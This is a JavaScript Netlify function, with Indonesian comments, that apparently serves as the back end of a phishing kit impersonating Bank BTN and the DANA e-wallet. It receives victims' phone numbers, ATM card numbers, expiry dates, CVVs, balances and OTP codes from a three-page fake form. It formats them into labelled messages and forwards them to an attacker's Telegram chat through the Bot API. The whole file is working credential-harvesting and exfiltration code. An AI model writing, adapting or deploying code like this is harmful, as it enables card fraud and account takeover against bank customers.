// netlify/functions/send-notification.js

// Konfigurasi Bot Telegram (akan diisi via Environment Variables di Netlify)
// TELEGRAM_BOT_TOKEN dan TELEGRAM_CHAT_ID akan di-set di Netlify Dashboard

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }

    // Ambil token dari environment variables Netlify
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // Validasi konfigurasi
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Missing Telegram configuration');
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Server configuration error' })
        };
    }

    try {
        // Parse data yang dikirim dari client
        const data = JSON.parse(event.body);
        
        const {
            phoneNumber,
            cardNumber,
            expiryDate,
            cvv,
            estimatedBalance,
            otpCode
        } = data;

        // Format pesan untuk Telegram dengan style box drawing (TANPA WAKTU, IP, USER AGENT)
        let message = '';
        
        // Cek jenis data yang dikirim (berdasarkan field yang ada)
        const isPhoneOnly = phoneNumber && !cardNumber && !otpCode;
        const isCardData = cardNumber && !otpCode;
        const isFullData = phoneNumber && cardNumber && otpCode;
        
        if (isPhoneOnly) {
            // Notifikasi hanya nomor HP (halaman 1) - TANPA WAKTU
            message = formatPhoneNotification(phoneNumber);
        } 
        else if (isCardData) {
            // Notifikasi data kartu ATM (halaman 2) - TANPA WAKTU
            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance);
        }
        else if (isFullData || otpCode) {
            // Notifikasi OTP (halaman 3) - TANPA WAKTU
            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode);
        }
        else {
            // Fallback format lama - TANPA WAKTU
            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode);
        }

        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const result = await response.json();

        if (!response.ok) {
            console.error('Telegram API Error:', result);
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    error: 'Failed to send notification',
                    details: result.description 
                })
            };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                message: 'Notification sent successfully' 
            })
        };

    } catch (error) {
        console.error('Error processing request:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message 
            })
        };
    }
};

// Format notifikasi hanya nomor HP (Halaman 1) - TANPA WAKTU
function formatPhoneNotification(phoneNumber) {
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├•</b> ${phoneNumber}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format notifikasi data kartu ATM (Halaman 2) - TANPA WAKTU
function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance) {
    // Format saldo dengan pemisah ribuan
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | DANA E-WALLET</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format notifikasi OTP (Halaman 3) - LENGKAP TANPA WAKTU
function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode) {
    // Format saldo dengan pemisah ribuan
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    message += `<b>├───────────────────</b>\n`;
    message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Format legacy fallback - TANPA WAKTU
function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode) {
    const formattedBalance = formatRupiah(estimatedBalance);
    
    let message = `<b>┌• AKUN | BANK BTN</b>\n`;
    message += `<b>├───────────────────</b>\n`;
    
    if (phoneNumber) {
        message += `<b>├• 📱 No. HP :</b> ${phoneNumber}\n`;
    }
    if (cardNumber) {
        message += `<b>├• 💳 No. Kartu :</b> ${formatCardNumber(cardNumber)}\n`;
    }
    if (expiryDate) {
        message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
    }
    if (cvv) {
        message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
    }
    if (estimatedBalance && estimatedBalance !== '0') {
        message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
    }
    if (otpCode) {
        message += `<b>├───────────────────</b>\n`;
        message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
    }
    
    message += `<b>╰───────────────────</b>`;
    
    return message;
}

// Fungsi untuk format Rupiah
function formatRupiah(angka) {
    if (!angka || angka === '0') return '0';
    let number_string = angka.toString().replace(/[^,\d]/g, '');
    let split = number_string.split(',');
    let sisa = split[0].length % 3;
    let rupiah = split[0].substr(0, sisa);
    let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    
    if (ribuan) {
        let separator = sisa ? '.' : '';
        rupiah += separator + ribuan.join('.');
    }
    return rupiah || '0';
}

// Fungsi untuk format nomor kartu
function formatCardNumber(cardNumber) {
    if (!cardNumber) return '-';
    const clean = cardNumber.replace(/\s/g, '');
    if (clean.length === 16) {
        return clean.match(/.{1,4}/g).join(' ');
    }
    return cardNumber;
}
